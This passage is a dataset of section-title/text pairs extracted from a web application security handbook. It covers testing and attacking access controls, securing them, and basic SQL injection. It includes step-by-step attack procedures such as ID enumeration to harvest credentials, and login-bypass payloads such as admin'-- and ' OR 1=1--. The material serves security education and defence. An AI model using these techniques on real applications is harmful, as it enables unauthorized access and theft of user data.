are likely to present dif-\nferent functionality or links to ordinary and administrative users (for\nexample, Control Panel or My Home Page), try adding parameters such\nasadmin=true to the URL query string and the body of POST requests.\nThis will help you determine whether this uncovers or gives access to any\nadditional functionality than your user context has normal access to.\n3. Test whether the application uses the Referer header as the basis for\nmaking access control decisions. For key application functions that you\nare authorized to access, try removing or modifying the Referer header,\nand determine whether your request is still successful. If not, the applica-\ntion may be trusting the Referer header in an unsafe way. If you scan\nrequests using Burp’s active scanner, Burp tries to remove the Referer\nheader from each request and informs you if this appears to make a sys-\ntematic and relevant difference to the application’s response.\n4. Review all client-side HTML and scripts to find references to hidden\nfunctionality or functionality that can be manipulated on the client side,\nsuch as script-based user interfaces. Also, decompile all browser exten-\nsion components as described in Chapter 5 to discover any references to\nserver-side functionality.\nTRY IT!\nhttp://mdsec.net/auth/477/\nhttp://mdsec.net/auth/472/\nhttp://mdsec.net/auth/466/\nWhen all accessible functionality has been enumerated, you need to test\nwhether per-user segregation of access to resources is being correctly enforced.\nIn every instance where the application grants users access to a subset of a wider\nrange of resources of the same type (such as documents, orders, e-mails, and\npersonal details), there may be opportunities for one user to gain unauthorized\naccess to other resources.\nHACK STEPS\n1. Where the application uses identifiers of any kind (document IDs, account\nnumbers, order references) to specify which resource a user is requesting,\nattempt to discover the identifiers for resources to which you do not have\nauthorized access.\ncc0088..iinndddd 227744 88//1199//22001111 1122::0088::3333 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 275\nChapter 8 n Attacking Access Controls 275\n2. If it is possible to generate a series of such identifiers in quick succes-\nsion (for example, by creating multiple new documents or orders), use the\ntechniques described in Chapter 7 for session tokens to try to discover\nany predictable sequences in the identifiers the application produces.\n3. If it is not possible to generate any new identifiers, you are restricted to\nanalyzing the identifiers you have already discovered, or even using plain\nguesswork. If the identifier has the form of a GUID, it is unlikely that any\nattempts based on guessing will be successful. However, if it is a relatively\nsmall number, try other numbers in close range, or random numbers with\nthe same number of digits.\n4. If access controls are found to be broken, and resource identifiers are\nfound to be predictable, you can mount an automated attack to harvest\nsensitive resources and information from the application. Use the tech-\nniques described in Chapter 14 to design a bespoke automated attack to\nretrieve the data you require.\nA catastrophic vulnerability of this kind occurs where an Account Information\npage displays a user’s personal details together with his username and pass-\nword. Although the password typically is masked on-screen, it is nevertheless\ntransmitted in full to the browser. Here, you can often quickly iterate through\nthe full range of account identifi ers to harvest the login credentials of all users,\nincluding administrators. Figure 8-5 shows Burp Intruder being used to carry\nout a successful attack of this kind.\nFigure 8-5: A successful attack to harvest usernames and passwords via\nan access control vulnerability\ncc0088..iinndddd 227755 88//1199//22001111 1122::0088::3333 PPMM"
  },
  {
    "input": "Testing Direct Access to Methods",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 276\n276 Chapter 8 n Attacking Access Controls\nTRY IT!\nhttp://mdsec.net/auth/488/\nhttp://mdsec.net/auth/494/\nTIP When you detect an access control vulnerability, an immediate attack to\nfollow up with is to attempt to escalate your privileges further by compro-\nmising a user account that has administrative privileges. You can use various\ntricks to locate an administrative account. Using an access control fl aw like\nthe one illustrated, you may harvest hundreds of user credentials and not\nrelish the task of logging in manually as every user until you fi nd an admin-\nistrator. However, when accounts are identifi ed by a sequential numeric\nID, it is common to fi nd that the lowest account numbers are assigned to\nadministrators. Logging in as the fi rst few users who were registered with\nthe application often identifi es an administrator. If this approach fails, an\neffective method is to fi nd a function within the application where access is\nproperly segregated horizontally, such as the main home page presented to\neach user. Write a script to log in using each set of captured credentials, and\nthen try to access your own home page. It is likely that administrative users\ncan view every user’s home page, so you will immediately detect when an\nadministrative account is being used.\nTesting Direct Access to Methods\nWhere an application uses requests that give direct access to server-side API\nmethods, any access control weaknesses within those methods normally are\nidentifi ed using the methodology already described. However, you should also\ntest for the existence of additional APIs that may not be properly protected.\nFor example, a servlet may be invoked using the following request:\nPOST /svc HTTP/1.1\nAccept-Encoding: gzip, deflate\nHost: wahh-app\nContent-Length: 37\nservlet=com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug\nSince this is a well-known servlet, perhaps you can access other servlets to\nperform unauthorized actions.\ncc0088..iinndddd 227766 88//1199//22001111 1122::0088::3333 PPMM"
  },
  {
    "input": "Testing Controls Over Static Resources",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 277\nChapter 8 n Attacking Access Controls 277\nHACK STEPS\n1. Identify any parameters that follow Java naming conventions (for exam-\nple,get,set,add,update,is, or has followed by a capitalized word), or\nexplicitly specify a package structure (for example, com.companyname\n.xxx.yyy.ClassName). Make a note of all referenced methods you can\nfind.\n2. Look out for a method that lists the available interfaces or methods.\nCheck through your proxy history to see if it has been called as part of\nthe application’s normal communication. If not, try to guess it using the\nobserved naming convention.\n3. Consult public resources such as search engines and forum sites to deter-\nmine any other methods that might be accessible.\n4. Use the techniques described in Chapter 4 to guess other method names.\n5. Attempt to access all methods gathered using a variety of user account\ntypes, including unauthenticated access.\n6. If you do not know the number or types of arguments expected by some\nmethods, look for methods that are less likely to take arguments, such as\nlistInterfaces and getAllUsersInRoles.\nTesting Controls Over Static Resources\nIn cases where static resources that the application is protecting are ultimately\naccessed directly via URLs to the resource fi les themselves, you should test\nwhether it is possible for unauthorized users to simply request these URLs directly.\nHACK STEPS\n1. Step through the normal process for gaining access to a protected static\nresource to obtain an example of the URL by which it is ultimately\nretrieved.\n2. Using a different user context (for example, a less-privileged user or an\naccount that has not made a required purchase), attempt to access the\nresource directly using the URL you have identified.\n3. If this attack succeeds, try to understand the naming scheme being used\nfor protected static files. If possible, construct an automated attack to\ntrawl for content that may be useful or that may contain sensitive data\n(see Chapter 14).\ncc0088..iinndddd 227777 88//1199//22001111 1122::0088::3344 PPMM"
  },
  {
    "input": "Securing Access Controls",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 278\n278 Chapter 8 n Attacking Access Controls\nTesting Restrictions on HTTP Methods\nAlthough there may not be a ready means of detecting whether an application’s\naccess controls make use of platform-level controls over HTTP methods, you\ncan take some simple steps to identify any vulnerabilities.\nHACK STEPS\n1. Using a high-privileged account, identify some privileged requests that\nperform sensitive actions, such as adding a new user or changing a user’s\nsecurity role.\n2. If these requests are not protected by any anti-CSRF tokens or similar\nfeatures (see Chapter 13), use the high-privileged account to determine\nwhether the application still carries out the requested action if the HTTP\nmethod is modified. Test the following HTTP methods:\nn POST\nn GET\nn HEAD\nn An arbitrary invalid HTTP method\n3. If the application honors any requests using different HTTP methods than\nthe original method, test the access controls over those requests using the\nstandard methodology already described, using accounts with lower\nprivileges.\nSecuring Access Controls\nAccess controls are one of the easiest areas of web application security to under-\nstand, although you must carefully apply a well-informed, thorough methodology\nwhen implementing them.\nFirst, you should avoid several obvious pitfalls. These usually arise from\nignorance about the essential requirements of effective access control or fl awed\nassumptions about the kinds of requests that users will make and against which\nthe application needs to defend itself:\nn Do not rely on users’ ignorance of application URLs or the identifi ers used\nto specify application resources, such as account numbers and document\nIDs. Assume that users know every application URL and identifi er, and\nensure that the application’s access controls alone are suffi cient to prevent\nunauthorized access.\ncc0088..iinndddd 227788 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 279\nChapter 8 n Attacking Access Controls 279\nn Do not trust any user-submitted parameters to signify access rights (such\nasadmin=true).\nn Do not assume that users will access application pages in the intended\nsequence. Do not assume that because users cannot access the Edit Users\npage, they cannot reach the Edit User X page that is linked from it.\nn Do not trust the user not to tamper with any data that is transmitted via\nthe client. If some user-submitted data has been validated and then is\ntransmitted via the client, do not rely on the retransmitted value without\nrevalidation.\nThe following represents a best-practice approach to implementing effective\naccess controls within web applications:\nn Explicitly evaluate and document the access control requirements for\nevery unit of application functionality. This needs to include both who\ncan legitimately use the function and what resources individual users\nmay access via the function.\nn Drive all access control decisions from the user’s session.\nn Use a central application component to check access controls.\nn Process every client request via this component to validate that the user\nmaking the request is permitted to access the functionality and resources\nbeing requested.\nn Use programmatic techniques to ensure that there are no exceptions to the\nprevious point. An effective approach is to mandate that every application\npage must implement an interface that is queried by the central access\ncontrol mechanism. If you force developers to explicitly code access control\nlogic into every page, there can be no excuse for omissions.\nn For particularly sensitive functionality, such as administrative pages, you\ncan further restrict access by IP address to ensure that only users from\na specifi c network range can access the functionality, regardless of their\nlogin status.\nn If static content needs to be protected, there are two methods of provid-\ning access control. First, static fi les can be accessed indirectly by passing\na fi lename to a dynamic server-side page that implements relevant access\ncontrol logic. Second, direct access to static fi les can be controlled using HTTP\nauthentication or other features of the application server to wrap the incom-\ning request and check the resource’s permissions before access is granted.\nn Identifi ers specifying which resource a user wants to access are vulner-\nable to tampering whenever they are transmitted via the client. The server\ncc0088..iinndddd 227799 88//1199//22001111 1122::0088::3344 PPMM"
  },
  {
    "input": "A Multilayered Privilege Model",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 280\n280 Chapter 8 n Attacking Access Controls\nshould trust only the integrity of server-side data. Any time these identi-\nfi ers are transmitted via the client, they need to be revalidated to ensure\nthat the user is authorized to access the requested resource.\nn For security-critical application functions such as the creation of a new bill\npayee in a banking application, consider implementing per-transaction\nreauthentication and dual authorization to provide additional assurance\nthat the function is not being used by an unauthorized party. This also\nmitigates the consequences of other possible attacks, such as session\nhijacking.\nn Log every event where sensitive data is accessed or a sensitive action is\nperformed. These logs will enable potential access control breaches to be\ndetected and investigated.\nWeb application developers often implement access control functions on a\npiecemeal basis. They add code to individual pages in cases where some access\ncontrol is required, and they often cut and paste the same code between pages\nto implement similar requirements. This approach carries an inherent risk of\ndefects in the resulting access control mechanism. Many cases are overlooked\nwhere controls are required, controls designed for one area may not operate in\nthe intended way in another area, and modifi cations made elsewhere within the\napplication may break existing controls by violating assumptions made by them.\nIn contrast to this approach, the previously described method of using a\ncentral application component to enforce access controls has many benefi ts:\nn It increases the clarity of access controls within the application, enabling\ndifferent developers to quickly understand the controls implemented by\nothers.\nn It makes maintainability more effi cient and reliable. Most changes need\nto be applied only once, to a single shared component, and do not need\nto be cut and pasted to multiple locations.\nn It improves adaptability. Where new access control requirements arise,\nthey can be easily refl ected within an existing API implemented by each\napplication page.\nn It results in fewer mistakes and omissions than if access control code is\nimplemented piecemeal throughout the application.\nA Multilayered Privilege Model\nIssues relating to access apply not only to the web application itself but also\nto the other infrastructure tiers that lie beneath it — in particular, the applica-\ntion server, the database, and the operating system. Taking a defense-in-depth\napproach to security entails implementing access controls at each of these layers\ncc0088..iinndddd 228800 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 281\nChapter 8 n Attacking Access Controls 281\nto create several layers of protection. This provides greater assurance against\nthreats of unauthorized access, because if an attacker succeeds at compromising\ndefenses at one layer, the attack may yet be blocked by defenses at another layer.\nIn addition to implementing effective access controls within the web appli-\ncation itself, as already described, a multilayered approach can be applied in\nvarious ways to the components that underlie the application:\nn The application server can be used to control access to entire URL paths\non the basis of user roles that are defi ned at the application server tier.\nn The application can employ a different database account when car-\nrying out the actions of different users. For users who should only be\nquerying data (not updating it), an account with read-only privileges\nshould be used.\nn Fine-grained control over access to different database tables can be imple-\nmented within the database itself, using a table of privileges.\nn The operating system accounts used to run each component in the infra-\nstructure can be restricted to the least powerful privileges that the com-\nponent actually requires.\nIn a complex, security-critical application, layered defenses of this kind can\nbe devised with the help of a matrix defi ning the different user roles within\nthe application and the different privileges, at each tier, that should be assigned\nto each role. Figure 8-6 is a partial example of a privilege matrix for a complex\napplication.\nApplication Server Application Roles Database Privileges\nFigure 8-6: A privilege matrix for a complex application\ncc0088..iinndddd 228811 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 282\n282 Chapter 8 n Attacking Access Controls\nWithin a security model of this kind, you can see how various useful access\ncontrol concepts can be applied:\nn Programmatic control — The matrix of individual database privileges is\nstored in a table within the database and is applied programmatically to\nenforce access control decisions. The classifi cation of user roles provides a\nshortcut for applying certain access control checks, and this is also applied\nprogrammatically. Programmatic controls can be extremely fi ne-grained\nand can build arbitrarily complex logic into the process of carrying out\naccess control decisions within the application.\nn Discretionary access control (DAC) — Administrators can delegate their\nprivileges to other users in relation to specifi c resources they own, employ-\ning discretionary access control. This is a closedDAC model, in which access\nis denied unless explicitly granted. Administrators also can lock or expire\nindividual user accounts. This is an openDAC model, in which access is\npermitted unless explicitly withdrawn. Various application users have privi-\nleges to create user accounts, again applying discretionary access control.\nn Role-based access control (RBAC) — Named roles contain different sets\nof specifi c privileges, and each user is assigned to one of these roles. This\nserves as a shortcut for assigning and enforcing different privileges and\nis necessary to help manage access control in complex applications. Using\nroles to perform up-front access checks on user requests enables many\nunauthorized requests to be quickly rejected with a minimum amount of\nprocessing being performed. An example of this approach is protecting\nthe URL paths that specifi c types of users may access.\nWhen designing role-based access control mechanisms, you must balance\nthe number of roles so that they remain a useful tool to help manage privi-\nleges within the application. If too many fi ne-grained roles are created, the\nnumber of different roles becomes unwieldy, and they are diffi cult to manage\naccurately. If too few roles are created, the resulting roles will be a coarse\ninstrument for managing access. It is likely that individual users will be\nassigned privileges that are not strictly necessary to perform their function.\nIf platform-level controls are used to restrict access to different application\nroles based on HTTP method and URL, these should be designed using\na default-deny model, as is best practice for fi rewall rules. This should\ninclude various specifi c rules that assign certain HTTP methods and URLs\nto certain roles, and the fi nal rule should deny any request that does not\nmatch a previous rule.\nn Declarative control — The application uses restricted database accounts\nwhen accessing the database. It employs different accounts for different\ngroups of users, with each account having the least level of privilege\ncc0088..iinndddd 228822 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 283\nChapter 8 n Attacking Access Controls 283\nnecessary to carry out the actions that group is permitted to perform.\nDeclarative controls of this kind are declared from outside the applica-\ntion. This is a useful application of defense-in-depth principles, because\nprivileges are imposed on the application by a different component. Even\nif a user fi nds a way to breach the access controls implemented within the\napplication tier in order to perform a sensitive action, such as adding a\nnew user, he is prevented from doing so. The database account that he is\nusing does not have the required privileges within the database.\nA different means of applying declarative access control exists at the\napplication server level, via deployment descriptor fi les, which are applied\nduring application deployment. However, these can be relatively blunt\ninstruments and do not always scale well to manage fi ne-grained privi-\nleges in a large application.\nHACK STEPS\nIf you are attacking an application that employs a multilayered privilege\nmodel of this kind, it is likely that many of the most obvious mistakes that\nare commonly made in applying access controls will be defended against. You\nmay fi nd that circumventing the controls implemented within the application\ndoes not get you very far, because of protection in place at other layers. With\nthis in mind, several potential lines of attack are still available to you. Most\nimportantly, understanding the limitations of each type of control, in terms of\nthe protection it does not offer, will help you identify the vulnerabilities that\nare most likely to affect it:\nn Programmatic checks within the application layer may be susceptible to\ninjection-based attacks.\nn Roles defi ned at the application server layer are often coarsely defi ned\nand may be incomplete.\nn Where application components run using low-privileged operating sys-\ntem accounts, typically they can read many kinds of potentially sensitive\ndata within the host fi le system. Any vulnerabilities granting arbitrary fi le\naccess may still be usefully exploited, even if only to read sensitive data.\nn Vulnerabilities within the application server software itself typically\nenable you to defeat all access controls implemented within the appli-\ncation layer, but you may still have limited access to the database and\noperating system.\nn A single exploitable access control vulnerability in the right location may\nstill provide a starting point for serious privilege escalation. For example,\nif you discover a way to modify the role associated with your account,\nyou may fi nd that logging in again with that account gives you enhanced\naccess at both the application and database layers.\ncc0088..iinndddd 228833 88//1199//22001111 1122::0088::3344 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 284\n284 Chapter 8 n Attacking Access Controls\nSummary\nAccess control defects can manifest themselves in various ways. In some cases,\nthey may be uninteresting, allowing illegitimate access to a harmless function\nthat cannot be leveraged to escalate privileges any further. In other cases, fi nd-\ning a weakness in access controls can quickly lead to a complete compromise\nof the application.\nFlaws in access control can arise from various sources. A poor application\ndesign may make it diffi cult or impossible to check for unauthorized access, a\nsimple oversight may leave only one or two functions unprotected, or defective\nassumptions about how users will behave can leave the application undefended\nwhen those assumptions are violated.\nIn many cases, fi nding a break in access controls is almost trivial. You simply\nrequest a common administrative URL and gain direct access to the functional-\nity. In other cases, it may be very hard, and subtle defects may lurk deep within\napplication logic, particularly in complex, high-security applications. The most\nimportant lesson when attacking access controls is to look everywhere. If you\nare struggling to make progress, be patient, and test every step of every applica-\ntion function. A bug that allows you to own the entire application may be just\naround the corner.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. An application may use the HTTP Referer header to control access without\nany overt indication of this in its normal behavior. How can you test for\nthis weakness?\n2. You log in to an application and are redirected to the following URL:\nhttps://wahh-app.com/MyAccount.php?uid=1241126841\nThe application appears to be passing a user identifi er to the MyAccount.php\npage. The only identifi er you are aware of is your own. How can you test\nwhether the application is using this parameter to enforce access controls\nin an unsafe way?\n3. A web application on the Internet enforces access controls by examining\nusers’ source IP addresses. Why is this behavior potentially fl awed?\ncc0088..iinndddd 228844 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 285\nChapter 8 n Attacking Access Controls 285\n4. An application’s sole purpose is to provide a searchable repository of\ninformation for use by members of the public. There are no authentica-\ntion or session-handling mechanisms. What access controls should be\nimplemented within the application?\n5. When browsing an application, you encounter several sensitive resources\nthat need to be protected from unauthorized access and that have the .xls\nfi le extension. Why should these immediately catch your attention?\ncc0088..iinndddd 228855 88//1199//22001111 1122::0088::3355 PPMM\nStuttard c08.indd V1 - 07/04/2011 Page 286\ncc0088..iinndddd 228866 88//1199//22001111 1122::0088::3355 PPMM"
  },
  {
    "input": "Chapter 9 Attacking Data Stores",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 287\nCHAPTER\n9\nAttacking Data Stores\nNearly all applications rely on a data store to manage data that is processed\nwithin the application. In many cases this data drives the core application logic,\nholding user accounts, permissions, application confi guration settings, and more.\nData stores have evolved to become signifi cantly more than passive containers\nfor data. Most hold data in a structured format, accessed using a predefi ned\nquery format or language, and contain internal logic to help manage that data.\nTypically, applications use a common privilege level for all types of access\nto the data store and when processing data belonging to different application\nusers. If an attacker can interfere with the application’s interaction with the data\nstore, to make it retrieve or modify different data, he can usually bypass any\ncontrols over data access that are imposed at the application layer.\nThe principle just described can be applied to any kind of data store tech-\nnology. Because this is a practical handbook, we will focus on the knowledge\nand techniques you need to exploit the vulnerabilities that exist in real-world\napplications. By far the most common data stores are SQL databases, XML-\nbased repositories, and LDAP directories. Practical examples seen elsewhere\nare also covered.\nIn covering these key examples, we will describe the practical steps that you\ncan take to identify and exploit these defects. There is a conceptual synergy in\nthe process of understanding each new type of injection. Having grasped the\nessentials of exploiting these manifestations of the fl aw, you should be confi dent\nthat you can draw on this understanding when you encounter a new category\n287\ncc0099..iinndddd 228877 88//1199//22001111 1122::0099::2288 PPMM"
  },
  {
    "input": "Bypassing a Login",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 288\n288 Chapter 9 n Attacking Data Stores\nof injection. Indeed, you should be able to devise additional means of attacking\nthose that others have already studied.\nInjecting into Interpreted Contexts\nAn interpreted language is one whose execution involves a runtime component\nthat interprets the language’s code and carries out the instructions it contains.\nIn contrast, a compiled language is one whose code is converted into machine\ninstructions at the time of generation. At runtime, these instructions are executed\ndirectly by the processor of the computer that is running it.\nIn principle, any language can be implemented using either an interpreter or\na compiler, and the distinction is not an inherent property of the language itself.\nNevertheless, most languages normally are implemented in only one of these\ntwo ways, and many of the core languages used to develop web applications\nare implemented using an interpreter, including SQL, LDAP, Perl, and PHP.\nBecause of how interpreted languages are executed, a family of vulnerabilities\nknown as codeinjection arises. In any useful application, user-supplied data is\nreceived, manipulated, and acted on. Therefore, the code that the interpreter\nprocesses is a mix of the instructions written by the programmer and the data\nsupplied by the user. In some situations, an attacker can supply crafted input\nthat breaks out of the data context, usually by supplying some syntax that has\na special signifi cance within the grammar of the interpreted language being\nused. The result is that part of this input gets interpreted as program instruc-\ntions, which are executed in the same way as if they had been written by the\noriginal programmer. Often, therefore, a successful attack fully compromises\nthe component of the application that is being targeted.\nIn native compiled languages, on the other hand, attacks designed to execute\narbitrary commands are usually very different. The method of injecting code\nnormally does not leverage any syntactic feature of the language used to develop\nthe target program, and the injected payload usually contains machine code\nrather than instructions written in that language. See Chapter 16 for details of\ncommon attacks against native compiled software.\nBypassing a Login\nThe process by which an application accesses a data store usually is the same,\nregardless of whether that access was triggered by the actions of an unprivi-\nleged user or an application administrator. The web application functions as a\ndiscretionary access control to the data store, constructing queries to retrieve,\nadd, or modify data in the data store based on the user’s account and type.\nA successful injection attack that modifi es a query (and not merely the data\ncc0099..iinndddd 228888 88//1199//22001111 1122::0099::2299 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 289\nChapter 9 n Attacking Data Stores 289\nwithin the query) can bypass the application’s discretionary access controls\nand gain unauthorized access.\nIf security-sensitive application logic is controlled by the results of a query, an\nattacker can potentially modify the query to alter the application’s logic. Let’s\nlook at a typical example where a back-end data store is queried for records in\na user table that match the credentials that a user supplied. Many applications\nthat implement a forms-based login function use a database to store user cre-\ndentials and perform a simple SQL query to validate each login attempt. Here\nis a typical example:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nThis query causes the database to check every row within the users table\nand extract each record where the username column has the value marcus and\nthe password column has the value secret. If a user’s details are returned to\nthe application, the login attempt is successful, and the application creates an\nauthenticated session for that user.\nIn this situation, an attacker can inject into either the username or the password\nfi eld to modify the query performed by the application and thereby subvert its\nlogic. For example, if an attacker knows that the username of the application\nadministrator is admin, he can log in as that user by supplying any password\nand the following username:\nadmin’--\nThis causes the application to perform the following query:\nSELECT * FROM users WHERE username = ‘admin’--’ AND password = ‘foo’\nNote that the comment sequence (--) causes the remainder of the query to\nbe ignored, and so the query executed is equivalent to:\nSELECT * FROM users WHERE username = ‘admin’\nso the password check is bypassed.\nTRY IT!\nhttp://mdsec.net/auth/319/\nSuppose that the attacker does not know the administrator’s username. In\nmost applications, the fi rst account in the database is an administrative user,\nbecause this account normally is created manually and then is used to generate\ncc0099..iinndddd 228899 88//1199//22001111 1122::0099::2299 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 290\n290 Chapter 9 n Attacking Data Stores\nall other accounts via the application. Furthermore, if the query returns the\ndetails for more than one user, most applications will simply process the fi rst\nuser whose details are returned. An attacker can often exploit this behavior to\nlog in as the fi rst user in the database by supplying the username:\n‘ OR 1=1--\nThis causes the application to perform the query:\nSELECT * FROM users WHERE username = ‘’ OR 1=1--’ AND password = ‘foo’\nBecause of the comment symbol, this is equivalent to:\nSELECT * FROM users WHERE username = ‘’ OR 1=1\nwhich returns the details of all application users.\nNOTE Injecting into an interpreted context to alter application logic is a\ngeneric attack technique. A corresponding vulnerability could arise in LDAP\nqueries, XPath queries, message queue implementations, or indeed any\ncustom query language.\nHACK STEPS\nInjection into interpreted languages is a broad topic, encompassing many\ndifferent kinds of vulnerabilities and potentially affecting every component of\na web application’s supporting infrastructure. The detailed steps for detecting\nand exploiting code injection fl aws depend on the language that is being\ntargeted and the programming techniques employed by the application’s\ndevelopers. In every instance, however, the generic approach is as follows:\n1. Supply unexpected syntax that may cause problems within the context of\nthe particular interpreted language.\n2. Identify any anomalies in the application’s response that may indicate the\npresence of a code injection vulnerability.\n3. If any error messages are received, examine these to obtain evidence\nabout the problem that occurred on the server.\n4. If necessary, systematically modify your initial input in relevant ways in an\nattempt to confirm or disprove your tentative diagnosis of a vulnerability.\n5. Construct a proof-of-concept test that causes a safe command to be\nexecuted in a verifiable way, to conclusively prove that an exploitable\ncode injection flaw exists.\n6. Exploit the vulnerability by leveraging the functionality of the target\nlanguage and component to achieve your objectives.\ncc0099..iinndddd 229900 88//1199//22001111 1122::0099::2299 PPMM"
  },
  {
    "input": "Injecting into SQL",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 291\nChapter 9 n Attacking Data Stores 291\nInjecting into SQL\nAlmost every web application employs a database to store the various kinds of\ninformation it needs to operate. For example, a web application deployed by an\nonline retailer might use a database to store the following information:\nn User accounts, credentials, and personal information\nn Descriptions and prices of goods for sale\nn Orders, account statements, and payment details\nn The privileges of each user within the application\nThe means of accessing information within the database is Structured Query\nLanguage (SQL). SQL can be used to read, update, add, and delete information\nheld within the database.\nSQL is an interpreted language, and web applications commonly construct\nSQL statements that incorporate user-supplied data. If this is done in an unsafe\nway, the application may be vulnerable to SQL injection. This fl aw is one of the\nmost notorious vulnerabilities to have affl icted web applications. In the most\nserious cases, SQL injection can enable an anonymous attacker to read and\nmodify all data stored within the database, and even take full control of the\nserver on which the database is running.\nAs awareness of web application security has evolved, SQL injection vulner-\nabilities have become gradually less widespread and more diffi cult to detect\nand exploit. Many modern applications avoid SQL injection by employing APIs\nthat, if properly used, are inherently safe against SQL injection attacks. In these\ncircumstances, SQL injection typically occurs in the occasional cases where these\ndefense mechanisms cannot be applied. Finding SQL injection is sometimes a\ndiffi cult task, requiring perseverance to locate the one or two instances in an\napplication where the usual controls have not been applied.\nAs this trend has developed, methods for fi nding and exploiting SQL injection\nfl aws have evolved, using more subtle indicators of vulnerabilities, and more\nrefi ned and powerful exploitation techniques. We will begin by examining\nthe most basic cases and then go on to describe the latest techniques for blind\ndetection and exploitation.\nA wide range of databases are employed to support web applications. Although\nthe fundamentals of SQL injection are common to the vast majority of these, there\nare many differences. These range from minor variations in syntax to signifi cant\ndivergences in behavior and functionality that can affect the types of attacks you\ncan pursue. For reasons of space and sanity, we will restrict our examples to the\nthree most common databases you are likely to encounter — Oracle, MS-SQL,\nand MySQL. Wherever applicable, we will draw attention to the differences\nbetween these three platforms. Equipped with the techniques we describe here,\ncc0099..iinndddd 229911 88//1199//22001111 1122::0099::2299 PPMM"
  },
  {
    "input": "Exploiting a Basic Vulnerability",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 292\n292 Chapter 9 n Attacking Data Stores\nyou should be able to identify and exploit SQL injection fl aws against any other\ndatabase by performing some quick additional research.\nTIP In many situations, you will fi nd it extremely useful to have access to\na local installation of the same database that is being used by the applica-\ntion you are targeting. You will often fi nd that you need to tweak a piece of\nsyntax, or consult a built-in table or function, to achieve your objectives. The\nresponses you receive from the target application will often be incomplete\nor cryptic, requiring some detective work to understand. All of this is much\neasier if you can cross-reference with a fully transparent working version of\nthe database in question.\nIf this is not feasible, a good alternative is to fi nd a suitable interactive\nonline environment that you can experiment on, such as the interactive tutori-\nals at SQLzoo.net.\nExploiting a Basic Vulnerability\nConsider a web application deployed by a book retailer that enables users to\nsearch for products by author, title, publisher, and so on. The entire book catalog\nis held within a database, and the application uses SQL queries to retrieve details\nof different books based on the search terms supplied by users.\nWhen a user searches for all books published by Wiley, the application per-\nforms the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’ and\npublished=1\nThis query causes the database to check every row within the books table,\nextract each of the records where the publisher column has the value Wiley and\npublished has the value 1, and return the set of all these records. The application\nthen processes this record set and presents it to the user within an HTML page.\nIn this query, the words to the left of the equals sign are SQL keywords and\nthe names of tables and columns within the database. This portion of the query\nwas constructed by the programmer when the application was created. The\nexpression Wiley is supplied by the user, and its signifi cance is as an item of\ndata. String data in SQL queries must be encapsulated within single quotation\nmarks to separate it from the rest of the query.\nNow, consider what happens when a user searches for all books published\nby O’Reilly. This causes the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘O’Reilly’ and\npublished=1\ncc0099..iinndddd 229922 88//1199//22001111 1122::0099::2299 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 293\nChapter 9 n Attacking Data Stores 293\nIn this case, the query interpreter reaches the string data in the same way as\nbefore. It parses this data, which is encapsulated within single quotation marks,\nand obtains the value O. It then encounters the expression Reilly’, which is not\nvalid SQL syntax, and therefore generates an error:\nIncorrect syntax near ‘Reilly’.\nServer: Msg 105, Level 15, State 1, Line 1\nUnclosed quotation mark before the character string ‘\nWhen an application behaves in this way, it is wide open to SQL injection.\nAn attacker can supply input containing a quotation mark to terminate the\nstring he controls. Then he can write arbitrary SQL to modify the query that\nthe developer intended the application to execute. In this situation, for example,\nthe attacker can modify the query to return every book in the retailer’s catalog\nby entering this search term:\nWiley’ OR 1=1--\nThis causes the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR\n1=1--’ and published=1\nThis modifi es the WHERE clause of the developer’s query to add a second\ncondition. The database checks every row in the books table and extracts\neach record where the publisher column has the value Wiley or where 1 is\nequal to 1. Because 1 always equals 1, the database returns every record in\nthe books table.\nThe double hyphen in the attacker’s input is a meaningful expression in SQL\nthat tells the query interpreter that the remainder of the line is a comment and\nshould be ignored. This trick is extremely useful in some SQL injection attacks,\nbecause it enables you to ignore the remainder of the query created by the\napplication developer. In the example, the application encapsulates the user-\nsupplied string in single quotation marks. Because the attacker has terminated\nthe string he controls and injected some additional SQL, he needs to handle the\ntrailing quotation mark to avoid a syntax error, as in the O’Reilly example. He\nachieves this by adding a double hyphen, causing the remainder of the query\nto be treated as a comment. In MySQL, you need to include a space after the\ndouble hyphen, or use a hash character to specify a comment.\nThe original query also controlled access to only published books, because\nit specifi ed and published=1. By injecting the comment sequence, the attacker\nhas gained unauthorized access by returning details of all books, published or\notherwise.\ncc0099..iinndddd 229933 88//1199//22001111 1122::0099::2299 PPMM"
  },
  {
    "input": "Injecting into Different Statement Types",
